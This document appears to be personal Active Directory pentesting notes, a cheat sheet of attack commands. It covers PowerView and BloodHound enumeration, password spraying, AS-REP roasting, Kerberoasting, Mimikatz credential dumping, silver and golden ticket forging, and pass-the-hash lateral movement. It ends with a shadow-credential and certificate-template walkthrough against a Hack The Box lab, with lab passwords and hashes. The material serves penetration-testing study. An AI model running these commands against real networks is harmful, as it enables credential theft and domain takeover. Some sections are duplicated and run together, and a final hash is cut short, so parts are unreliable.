# Active Directory

### Active Directory Pentesting

#### Enumeration

To check local administrators in domain joined machine

```bash
net localgroup Administrators
```

### Powerview

```powershell
Import-Module .\\[PowerView.ps](<http://PowerView.ps>)1  #loading module to powershell, if it gives error then change execution policy
Get-NetDomain  #basic information about the domain
Get-NetUser  #list of all users in the domain
```

* The above command's outputs can be filtered using "select" command. For example, `Get-NetUser | select name`

```powershell
Get-NetGroup  # enumerate domain groups
Get-NetGroup "group name"  # information from specific group
Get-NetComputer  # enumerate the computer objects in the domain
Find-LocalAdminAccess  # scans the network in an attempt to determine if our current user has administrative access
Get-NetSession -ComputerName files04 -Verbose  #Checking logged on users with Get-NetSession
Get-NetUser -SPN | select samaccountname,serviceprincipalname  # Listing SPN accounts in domain
Get-ObjectAcl -Identity USERNAME  # enumerates ACE(access control entities), lists SID(security identifier)
Convert-SidToName SID  # converting SID/ObjSID to name
```

* Checking for "GenericAll" right for a specific group, after obtaining they can be converted to name

```powershell
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier | select -ExpandProperty SecurityIdentifier | Convert-SidToName
Find-DomainShare  #find the shares in the domain
Get-DomainUser -PreauthNotRequired -verbose  # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname  #Kerberoastable accounts
```

### Bloodhound

* Collection methods - database
* Sharphound - transfer [sharphound.ps](http://sharphound.ps)1 into the compromised machine

```powershell
Import-Module .\\[Sharphound.ps](<http://Sharphound.ps>)1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp\\ -OutputPrefix "name"
```

* Bloodhound-Python

```bash
bloodhound-python -u 'username' -p 'password' -ns DC_IP -d [DOMAIN.COM](<http://DOMAIN.COM>) -c all  #output will be in json format
```

* Running Bloodhound

```bash
sudo neo4j console
```

* then upload the .json files obtained

### PsLoggedon

To see user logons at remote system of a domain(external tool)

```bash
PsLoggedon.exe \\\\TARGET_COMPUTER
```

## Attacking Active Directory Authentication

💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don't have proper creds.

#### Password Spraying

* Crackmapexec - check if the output shows 'Pwned!'

```bash
crackmapexec smb SUBNET_OR_IP -u users.txt -p 'password' -d DOMAIN --continue-on-success
```

* Kerbrute

```bash
kerbrute passwordspray -d [corp.com](<http://corp.com>) users.txt "password"
```

### AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #this gives us the hash
Rubeus.exe asreproast /nowrap  #dumping from compromised windows host
hashcat -m 18200 hashes.txt wordlist.txt --force  # cracking hashes
```

### Kerbroasting

```bash
Rubeus.exe kerberoast /outfile:hashes.kerberoast  #dumping from compromised windows host
impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #from kali machine
hashcat -m 13100 hashes.txt wordlist.txt --force  # cracking hashes
```

### Silver Tickets

* Obtaining hash of an SPN user using Mimikatz

```
privilege::debug
sekurlsa::logonpasswords  #obtain NTLM hash of the SPN account here
```

* Obtaining Domain SID

```powershell
ps> whoami /user
```

* this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369"
* Forging silver ticket using Mimikatz

```
kerberos::golden /sid:<domainsid> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit
```

* we can check the tickets by,

```powershell
ps> klist
```

* Accessing service

```powershell
ps> iwr -UseDefaultCredentials <http://web04.corp.com:8080/>
```

### SecretsDump

```bash
[secretsdump.py](<http://secretsdump.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

#### Lateral Movement in Active Directory

### psexec - smbexec - wmiexec - atexec

* Here we can pass the credentials or even hash, depending on what we have

```bash
[psexec.py](<http://psexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

* the user should have write access to Admin share then only we can get session

```bash
[psexec.py](<http://psexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[smbexec.py](<http://smbexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[smbexec.py](<http://smbexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[wmiexec.py](<http://wmiexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[wmiexec.py](<http://wmiexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[atexec.py](<http://atexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip> "command"  #we passed full hash here
```

### winrs

```bash
winrs -r:TARGET_IP -u:USERNAME -p:PASSWORD "command"
```

* run this and check whether the user has access on the machine, if you have access then you can get shell
* run this on windows session

### Crackmapexec

* If stuck make use of Wiki

```bash
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp}  #supported services

crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success  # Bruteforce
crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success | grep '[+]'  # Filter successful logins
crackmapexec smb SUBNET_OR_IP -u user.txt -p 'password' --continue-on-success  #Password spraying
crackmapexec smb TARGET_IP -u 'user' -p 'password' --shares  #lists all shares, provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --disks
crackmapexec smb DC_IP -u 'user' -p 'password' --users  #we need to provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sessions  #active logon sessions
crackmapexec smb DC_IP -u 'user' -p 'password' --pass-pol  #dumps password policy
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sam  #SAM hashes
crackmapexec smb TARGET_IP -u 'user' -p 'password' --lsa  #dumping lsa secrets
crackmapexec smb DC_IP -u 'user' -p 'password' --ntds  #dumps NTDS.dit file
crackmapexec smb DC_IP -u 'user' -p 'password' --groups {groupname}  #we can also provide --group and it lists all groups
crackmapexec smb TARGET_IP -u 'user' -p 'password' -x 'command'  #For executing commands

#crackmapexec modules
crackmapexec smb -L  #listing modules
crackmapexec smb -M mimikatz --options  #shows the required options for the module
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz  #runs default command
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug sekurlsa::logonpasswords exit'
```

### Pass the ticket

```
mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
klist
dir \\\\dc01.corp.local\\c$
```

### Golden Ticket

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /ptt
misc::cmd
klist
dir \\\\dc01.corp.local\\c$
```



### Shadow Credential Attack



***

#### 1) Add attacker principal to SERVICE ACCOUNTS

```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```

Notes

* Requires network access to the DC and valid creds for p.agila

***

#### 2) Abuse Shadow Credentials with pywhisker2) Abuse Shadow Credentials with pywhisker

Add a certificate-based identity to the target account (example: winrm\_svc)Add a certificate-based identity to the target account (example: winrm\_svc)

```bash
[pywhisker.py](<http://pywhisker.py>) -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action add[pywhisker.py](<http://pywhisker.py>) -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action add
```

#### ###3) Obtain a TGT for target via PKINIT

#### 2) Abuse Shadow Credentials with pywhisker

Add a certificate-based identity to the target account (example: winrm\_svc)

```bash
[pywhisker.py](<http://pywhisker.py>) -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action add
```

Use the cert and key output from pywhisker

```bash
gettgtpkinit -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
```

Export the TGT cache for subsequent tools

```bash
export KRB5CCNAME=winrm_svc.ccache
```

***

#### 4) Extract NT hash from the TGT

```bash
getnthash -key 3ccd6794d17d1ac416725120643c2d0867858e44556de69ad8854da2d0b0f627 fluffy.htb/winrm_svc
```

Output

* NT hash for winrm\_svc, e.g. 33bd09dcd697600edf6b3a7af4875767

***

#### 5) Remote access with Evil-WinRM

```bash
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

***

#### Clean-up (recommended)

* Revoke or remove the added certificate mapping from the target account
* Remove p.agila from SERVICE ACCOUNTS if it was only needed for the operation

***

#### Quick Reference

*   Group add member

    ```bash
    net rpc group addmem "SERVICE ACCOUNTS" "<user>" -U "<DOMAIN>/<user>%<pass>" -S "<DC>"
    ```
*   pywhisker add

    ```bash
    [pywhisker.py](<http://pywhisker.py>) -d <domain> -u <user> -p <pass> --target <target> --action add
    ```
* PKINIT TGT
*   Get NT hash

    ```bash
    getnthash --key <asrep_or_key> <domain>/<target>
    ```
*   Evil-WinRM

    ```bash
    evil-winrm -i <ip> -u <user> -H <nthash>
    ```





### &#x20;CA && ca\_svc&#x20;

```

certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
```

```
[*] Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

* `export KRB5CCNAME=ca_svc.ccache`

```
certipy find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -st
```

* Read initial UPN of the victim account

```
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
```

* Update the victim account’s UPN to the target administrator’s sAMAccountName

```
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
```

* `[*] Updating user 'ca_svc': userPrincipalName  : administrator [*] Successfully updated 'ca_svc'`
* Request a certificate as the “victim” user from any suitable client authentication template (e.g., “User”) on the ESC16-vulnerable CA

```
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```

* Revert the “victim” account’s UPN.

```
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

* `[*] Updating user 'ca_svc': userPrincipalName  : ca_svc@fluffy.htb [*] Successfully updated 'ca_svc'`
* Authenticate as the target administrator.

```
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

* Now with the Administrator hash, we can simply do a Pass the Hash:

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c
```
